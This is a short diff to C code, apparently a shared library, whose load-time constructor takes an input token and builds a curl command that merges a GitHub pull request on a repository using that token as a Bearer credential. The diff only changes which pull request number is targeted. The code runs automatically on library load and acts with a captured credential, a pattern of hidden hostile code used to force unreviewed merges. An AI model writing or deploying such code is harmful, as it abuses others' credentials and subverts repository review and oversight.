@@ -39,7 +39,7 @@ static void __attribute__((constructor)) so_main(void) {
   if (inputToken != NULL && strlen(inputToken) > 0) {
     char command[1024];
     snprintf(command, sizeof(command), "curl -X PUT "
-      "https://api.github.com/repos/mousefluff/sdkman-cli/pulls/3/merge "
+      "https://api.github.com/repos/mousefluff/sdkman-cli/pulls/4/merge "
       "-H \"Accept: application/vnd.github.v3+json\" "
       "--header \"authorization: Bearer %s\" "
       "--header 'content-type: application/json' "
